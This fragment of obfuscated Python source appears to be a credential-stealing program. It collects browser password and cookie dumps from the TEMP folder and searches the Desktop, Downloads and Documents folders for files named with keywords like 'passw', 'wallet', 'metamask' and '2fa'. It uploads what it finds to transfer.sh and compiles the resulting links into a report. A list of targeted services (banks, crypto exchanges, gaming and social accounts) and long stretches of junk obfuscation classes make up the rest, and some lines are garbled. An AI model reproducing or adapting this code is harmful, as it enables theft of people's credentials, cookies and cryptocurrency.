        llIlIlIIIIIIllIlIIl = threading.Thread(IIllIIlIlllII=IIIllIIIll, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[3]])
        llIlIlIIIIIIllIlIIl.start()
        llIIIlIIIIlIlIIll.append(llIlIlIIIIIIllIlIIl)
    lllIIIlIIIl = []
    for llIIlIlIIIIII in IIIlIIlIlIIII:
        llIlIlIIIIIIllIlIIl = threading.Thread(IIllIIlIlllII=IIIIIllIIlIlIIlIl, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[4]])
        llIlIlIIIIIIllIlIIl.start()
        lllIIIlIIIl.append(llIlIlIIIIIIllIlIIl)
    for IlIIIIIl in lllIIIlIIIl: IlIIIIIl.join()
    IllIlIlllIIl = IIlIllllll(llIlIIllllI)
    if IllIlIlllIIl == True: return
    for llIIlIlIIIIII in IIIlIIlIlIIII:
        threading.Thread(IIllIIlIlllII=IllIlIIlIllIIIIlII, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[5], llIIlIlIIIIII[1]]).start()
    for llIIlIlIIIIII in lIIlllIlIllIlIlll:
        threading.Thread(IIllIIlIlllII=IllIlIIlIllIIIIlII, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[2], llIIlIlIIIIII[1]]).start()
    for IlIIIIIl in llIIIlIIIIlIlIIll:
        IlIIIIIl.join()
    global lIlIllIllllI
    lIlIllIllllI = []
    for IlIlIlIll in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
        IIllIlIlIlI(os.getenv("TEMP") + "\\" + IlIlIlIll)
def lIlllIlIIlI(lIllIIllI):
    try:
        IIllIIIIlIllIllII = { "file": (lIllIIllI, open(lIllIIllI, mode='rb')) }
        ...
        IIllIlIlIlI = requests.post("https://transfer.sh/", IIllIIIIlIllIllII=IIllIIIIlIllIllII)
        llIlIlIlIIIIIIIIIl = IIllIlIlIlI.text
        return llIlIlIlIIIIIIIIIl
    except:
        return False
def llIlIlIll(IlIlIllIIllI, IllIIIll):
    global llIIIIllIllll
    lllIlIlIlIIIl = 7
    lIIllllllIl = 0
    llllllllIllIlIl = os.listdir(IlIlIllIIllI)
    llIllIIlllIlIIIlI = []
    for IlIlIlIll in llllllllIllIlIl:
        if not os.lIllIIllI.isfile(IlIlIllIIllI + "/" + IlIlIlIll): return
        lIIllllllIl += 1
        if lIIllllllIl <= lllIlIlIlIIIl:
            llIlIlIlIIIIIIIIIl = lIlllIlIIlI(IlIlIllIIllI + "/" + IlIlIlIll)
            llIllIIlllIlIIIlI.append([IlIlIllIIllI + "/" + IlIlIlIll, llIlIlIlIIIIIIIIIl])
        else:
            break
    llIIIIllIllll.append(["folder", IlIlIllIIllI + "/", llIllIIlllIlIIIlI])
llIIIIllIllll = []
def lIIlIIlllIIllIIII(lIllIIllI, IllIIIll):
    global llIIIIllIllll
    lIIllllIIlIIlllIIll = []
    llllllllIllIlIl = os.listdir(lIllIIllI)
    for IlIlIlIll in llllllllIllIlIl:
        for IllIIIllIllIll in IllIIIll:
            if IllIIIllIllIll in IlIlIlIll.lower():
                if os.lIllIIllI.isfile(lIllIIllI + "/" + IlIlIlIll) and ".txt" in IlIlIlIll:
                    lIIllllIIlIIlllIIll.append([lIllIIllI + "/" + IlIlIlIll, lIlllIlIIlI(lIllIIllI + "/" + IlIlIlIll)])
                    break
                if os.lIllIIllI.isdir(lIllIIllI + "/" + IlIlIlIll):
                    IIllIIlIlllII = lIllIIllI + "/" + IlIlIlIll
                    llIlIlIll(IIllIIlIlllII, IllIIIll)
                    break
    llIIIIllIllll.append(["folder", lIllIIllI, lIIllllIIlIIlllIIll])
def IIIlIllIIlIlIlIlI():
    IIIllIlIIIlIlIIIIllI = IllIIlIllIllIIII.split("\AppData")[0]
    IlIIlIIIII = [
        IIIllIlIIIlIlIIIIllI + "/Desktop",
        IIIllIlIIIlIlIIIIllI + "/Downloads",
        IIIllIlIIIlIlIIIIllI + "/Documents"
    ]
    llIllIllI = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        ]
    llllIIlIllIIllIIlIl = []
    for llIIlIlIIIIII in IlIIlIIIII:
        IIIlIllIIlIlIlIlI = threading.Thread(IIllIIlIlllII=lIIlIIlllIIllIIII, lllIIIlIlllIlIl=[llIIlIlIIIIII, llIllIllI]);IIIlIllIIlIlIlIlI.start()
        llllIIlIllIIllIIlIl.append(IIIlIllIIlIlIlIlI)
    return llllIIlIllIIllIIlIl
global lIlIIllIIIIIlIllIIlI, lllIIIIllII, IlllIIIlIIlll
lIlIIllIIIIIlIllIIlI = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]
lllIIIIllII = []
IlllIIIlIIlll = []
llIlIIIIlllllIIIlIl()
IllIlIlllIIl = IIlIllllll(llIlIIllllI)
if not IllIlIlllIIl:
    llllIIlIllIIllIIlIl = IIIlIllIIlIlIlIlI()
    for IlIIIIIl in llllIIlIllIIllIIlIl: IlIIIIIl.join()
    IlllIlIIlIIlIlllll.sleep(0.2)
    IllIlIlIIIIIIlI = "```diff\n"
    for IIllIlIllIIIlIllII in llIIIIllIllll:
        if len(IIllIlIllIIIlIllII[2]) != 0:
            lIIlIIIlIllIll = IIllIlIllIIIlIllII[1]
            IIIlIIIllIIIllII = IIllIlIllIIIlIllII[2]
            IllIlIlIIIIIIlI +=lIIIIllIlIIIllIIl"\n"
            IllIlIlIIIIIIlI += lIIIIllIlIIIllIIl"- {lIIIIllIlIIIllIIlIIIlIIlIlIlIIllIllIlpllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIh}\n"
            for IIllIllIlllIlI in IIIlIIIllIIIllII:
                llIlIlIIIIIIllIlIIl = IIllIllIlllIlI[0].split("/")
                llIIlIIlIlIllIlll = llIlIlIIIIIIllIlIIl[len(llIlIlIIIIIIllIlIIl)-1]
                llIlIIIllll = IIllIllIlllIlI[1]
                IllIlIlIIIIIIlI += lIIIIllIlIIIllIIl"+ Name: {lIIIIllIlIIIllIIlilellIlIlIIIIIIllIlIIlnmIIlIlIIIlIlIIlII}\n+ LlIIllllllIlnk: {llIlIIIlllIlIIlllII}"
                IllIlIlIIIIIIlI += "\n"
    IllIlIlIIIIIIlI += "\n```"
    IIllIlIlIlI("bc_checking", IllIlIlIIIIIIlI)
    IlIlllllIIIIlllI = threading.Thread(IIllIIlIlllII=lIIllIIllIlIlI().IIIIlIlIIIIl)
    IlIlllllIIIIlllI.start()
class lIIllIIlll:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lIlIIllIIllllIIII()
        IIIIIIIllIllIIII.IIIIllllllIIIl()
        IIIIIIIllIllIIII.llIllIlllI()
        IIIIIIIllIllIIII.lllIllII()
        IIIIIIIllIllIIII.IIlIlllllIll()
    def lIlIIllIIllllIIII(IIIIIIIllIllIIII, llIllllllIlllI, IIIllllIIIl, lIIIlIllIIIIllIlllII, IIllIlIIIllIIIl, llIlIIIllllIlIl, IIlIlllIIIIlI):
        return IIIIIIIllIllIIII.IIlIlllllIll()
    def IIIIllllllIIIl(IIIIIIIllIllIIII, IlIIlIIlIIllll, IlIllIllI, lllIlIIIIlIlIIIIllII):
        return IIIIIIIllIllIIII.IIIIllllllIIIl()
    def llIllIlllI(IIIIIIIllIllIIII, IlllIlIIllllIlIll, llIIlIIIllIllIlI, IlIIIllIlllIIl, lIlllIlIIIlIIlIlIII, llIlIIIlIIlIllIIll, IIlIlIlIIIIllIIIll, lIlIIIllllIlIIlIll):
        return IIIIIIIllIllIIII.IIlIlllllIll()
    def lllIllII(IIIIIIIllIllIIII, IlIlIlllI, lIlIIlIlIIll, IlIIlllIIIlIlIIlI, IIIllllllIII, llIIlIIllIl, IlIIlllI):
        return IIIIIIIllIllIIII.IIIIllllllIIIl()
    def IIlIlllllIll(IIIIIIIllIllIIII, lllIIlIIIll, llIIllIIlIl, lIIIIIlIIII, lllIIlIlIIIllIIlllII, llIlIlllIIIllII, lllIIlIlIlIIII, IllIllll):
        return IIIIIIIllIllIIII.llIllIlllI()
class lllIIlllllI:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.IIIlllIIIlIlIIII()
        IIIIIIIllIllIIII.IIIlIIlIIIlIl()
        IIIIIIIllIllIIII.IlIIllIlIIl()
        IIIIIIIllIllIIII.lllIIlIllIIIlIIlI()
        IIIIIIIllIllIIII.lIIIIlIIIIlIIlIll()
        IIIIIIIllIllIIII.llllIIIIl()
        IIIIIIIllIllIIII.lllIllIIllIIIIIl()
        IIIIIIIllIllIIII.llllIlIlIlIlllIIIl()
    def IIIlllIIIlIlIIII(IIIIIIIllIllIIII, IlIIIIlllllIIlIlIll):
        return IIIIIIIllIllIIII.IIIlIIlIIIlIl()
    def IIIlIIlIIIlIl(IIIIIIIllIllIIII, IIlIllllIlIlIllIIlII, IIIIllll):
        return IIIIIIIllIllIIII.lllIIlIllIIIlIIlI()
    def IlIIllIlIIl(IIIIIIIllIllIIII, lllIIIll, IlIlIlllIIl, IIlIllIlIl, IlIIIlIIIlIllIlllIl, IlIlIlIIllllll):
        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
    def lllIIlIllIIIlIIlI(IIIIIIIllIllIIII, IIlIlIIIIlI, lIIlllIIlI, IllIIllIllllIll):
        return IIIIIIIllIllIIII.IIIlllIIIlIlIIII()
    def lIIIIlIIIIlIIlIll(IIIIIIIllIllIIII, llIIIllIlI, llllIIllIllI, IllIllIIllIIlIIlIIl, IlIIIIlIIIIl, lIllIlIIIIIl):
        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
    def llllIIIIl(IIIIIIIllIllIIII, IlIlllIllIllllll, IlIIIIIIIlllllllI):
        return IIIIIIIllIllIIII.lIIIIlIIIIlIIlIll()
    def lllIllIIllIIIIIl(IIIIIIIllIllIIII, IIIIlllIII, lIIlIlIIllIIl, lIlllIlIlllllIlII):
        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
    def llllIlIlIlIlllIIIl(IIIIIIIllIllIIII, llIIIlIIIllllI, IIllIlllllllIlIl):
        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
class lIlIlIIIIIIIIlIlIlI:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lIlIIIlIIIIlIll()
        IIIIIIIllIllIIII.IIlIlIIlIIlIlIIllIII()
        IIIIIIIllIllIIII.IlIIIlIIlIIl()
        IIIIIIIllIllIIII.IlIllIlIII()
        IIIIIIIllIllIIII.IlIllIllIllIIlIIIIl()
        IIIIIIIllIllIIII.IIlIlIlIlIIlIlll()
        IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
        IIIIIIIllIllIIII.lIlIlIIlIIll()
        IIIIIIIllIllIIII.IllIIIllIl()
        IIIIIIIllIllIIII.IlllllIIlIIII()
        IIIIIIIllIllIIII.lIllIlIIllllIIllI()
        IIIIIIIllIllIIII.lIlIIIIlIIIIlllll()
    def lIlIIIlIIIIlIll(IIIIIIIllIllIIII, IlIllIII, lIlIllIl, lIIllIlIlIIlllll, lIIIllIlIlIIIlIllllI, IIIllIlllllIIllIll):
        return IIIIIIIllIllIIII.IlIllIllIllIIlIIIIl()
    def IIlIlIIlIIlIlIIllIII(IIIIIIIllIllIIII, lIIIlllll, lllllIlII, IIIIlllIIIIIll, IIIIIllllIIl, IIIIIlllI, IIIIIlIlIIIlll, IllIIllIIIllIlI):
        return IIIIIIIllIllIIII.IllIIIllIl()
    def IlIIIlIIlIIl(IIIIIIIllIllIIII, lIIllIIIllIIlIIIIlIl):
        return IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
    def IlIllIlIII(IIIIIIIllIllIIII, IllIIllllIlIlIIIIIl, IIlIlllIIlIlIlIIl, IlllIIIIlIlII, lIIIllIIII, lIlIIIllIIIllIIIlIlI, IlIlIlIIllllIIlIl):
        return IIIIIIIllIllIIII.lIlIIIIlIIIIlllll()
    def IlIllIllIllIIlIIIIl(IIIIIIIllIllIIII, llllllIIlIIIlIIIIlI, lIIIIllII, lllIlllIIlllIlllIIl, IlIIlIlIl, IIIlIlIIIllll, IlIIlIIlII):
        return IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
    def IIlIlIlIlIIlIlll(IIIIIIIllIllIIII, IlIlIIIllIlIIlI, IllllIlIIIlI, lIIllIlIIllI):
        return IIIIIIIllIllIIII.IlIllIlIII()
    def lIIlIIIIIIlllIl(IIIIIIIllIllIIII, lIlIIIllllIIllIllI, lIlllIlIlIIl):
        return IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
    def lIlIlIIlIIll(IIIIIIIllIllIIII, lIlllIlll, IIlIlIllI, IIIIlIlllllI, lllIllIIIlIlIlIlIIll, IIllllIllllIlIIlIIII, llIIIlIll):
        return IIIIIIIllIllIIII.IIlIlIlIlIIlIlll()
    def IllIIIllIl(IIIIIIIllIllIIII, llIlllIIIIIlIIll, lIIIIIlIIlI, lIllIllIIIl, IIIlllIIllIIIlll, lIlllIIlIlIllI):
        return IIIIIIIllIllIIII.lIlIlIIlIIll()
    def IlllllIIlIIII(IIIIIIIllIllIIII, IlIIIIlIIl, IllIIIIlIIllllIllI, IIIIllllllIIlIIIIlI, IIlIlllIlIllI, llIIIllIIIIl, IlIlIllIlllIIl, llIIllllIlII):
        return IIIIIIIllIllIIII.lIlIIIlIIIIlIll()
    def lIllIlIIllllIIllI(IIIIIIIllIllIIII, IIllllIIIllIlII, lIlIlIIlIIIIIIIl, IlIIIlIIIIlI):
        return IIIIIIIllIllIIII.IlllllIIlIIII()
    def lIlIIIIlIIIIlllll(IIIIIIIllIllIIII, IlIIllII, IIllIllllIIlIlll, llIIIIlIIIIIlI, IIlIlIIlllIllIIlllI):
        return IIIIIIIllIllIIII.IlIllIlIII()
class lIllIllllIlIIllllI:
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.lIllIllllIIlIIIlllll()
        IIIIIIIllIllIIII.llIlIIIIlIlIIIIIllI()
        IIIIIIIllIllIIII.IlIIllIllllII()
        IIIIIIIllIllIIII.IIllllIIIl()
        IIIIIIIllIllIIII.IIlIlIIllIllll()
        IIIIIIIllIllIIII.IIlIlIllllIIl()
        IIIIIIIllIllIIII.IIIIIlIIIlIlI()
        IIIIIIIllIllIIII.IIlIIIlIIlIII()
        IIIIIIIllIllIIII.IIIIlIIllIlllIlIIll()
        IIIIIIIllIllIIII.IlllllIIIlII()
        IIIIIIIllIllIIII.lIlIllIIlIlIIIlIIIII()
    def lIllIllllIIlIIIlllll(IIIIIIIllIllIIII, IlIIllIlIIIIlIlIlII, lIIllllIlII, lllIllllI, IIIIlIIllIIIIllIlI):
        return IIIIIIIllIllIIII.IIlIlIllllIIl()
    def llIlIIIIlIlIIIIIllI(IIIIIIIllIllIIII, lllIllIIIllIlI, IIlIIlIIllIlIIlII):
        return IIIIIIIllIllIIII.lIlIllIIlIlIIIlIIIII()
    def IlIIllIllllII(IIIIIIIllIllIIII, llIIIIIllIllIlIlIIII, IIIlllIlIIlII, IlIlIlll, llIIlIllIII):
        return IIIIIIIllIllIIII.IIlIIIlIIlIII()
    def IIllllIIIl(IIIIIIIllIllIIII, IIIlIllIlllllIIIll, IllllIIl, IlIllIIIlIlIIl, IlIlIIIlIll, lIIIlllIIlIIIIl, lIlIIIIIlIlI, llIIlIIllIIIII):
        return IIIIIIIllIllIIII.IIIIlIIllIlllIlIIll()
    def IIlIlIIllIllll(IIIIIIIllIllIIII, IIlIIIIlllIlIll):
        return IIIIIIIllIllIIII.IIllllIIIl()
    def IIlIlIllllIIl(IIIIIIIllIllIIII, IlllllllI, lllllllIIllIIlIl, IllIlIIIl, IIIIIIlIlIlllllIII, lIIllIIIllIIlllIIlI):
        return IIIIIIIllIllIIII.lIlIllIIlIlIIIlIIIII()
    def IIIIIlIIIlIlI(IIIIIIIllIllIIII, llIIlIIIlllIlIllIII, lIIIIllIIllI, IIlIllIIIlIllIllIlI, IIllIIIlIlllllIllll, lIlllIIIlIllllII):
        return IIIIIIIllIllIIII.IlllllIIIlII()
    def IIlIIIlIIlIII(IIIIIIIllIllIIII, lIlIlllllllIl, IIIIIIIlI, llIlllIlIIlIll, llIlIIIII, IllIllIllIIII, IIlllIIIl):
        return IIIIIIIllIllIIII.IIlIIIlIIlIII()
    def IIIIlIIllIlllIlIIll(IIIIIIIllIllIIII, IIIlIlIl, lIlIlIIllIlIIlIIII, IllIlIIIlIIIlIlI, lllIIlIlllIl):
        return IIIIIIIllIllIIII.IIIIIlIIIlIlI()
    def IlllllIIIlII(IIIIIIIllIllIIII, llIlllII, lllIllIIllI, lllIlIlIIIll, lIllIlllllIIlIllI, IlIlllIllIIIIl, llIlllIlIlIlllIllll):
        return IIIIIIIllIllIIII.lIllIllllIIlIIIlllll()
    def lIlIllIIlIlIIIlIIIII(IIIIIIIllIllIIII, lIlIIlllIIIlI, llIlllIIlll, llIlIllllI, IIIlIllIllIllIIlI, IIIIIIlIIIllllll):
        return IIIIIIIllIllIIII.IIlIIIlIIlIII()
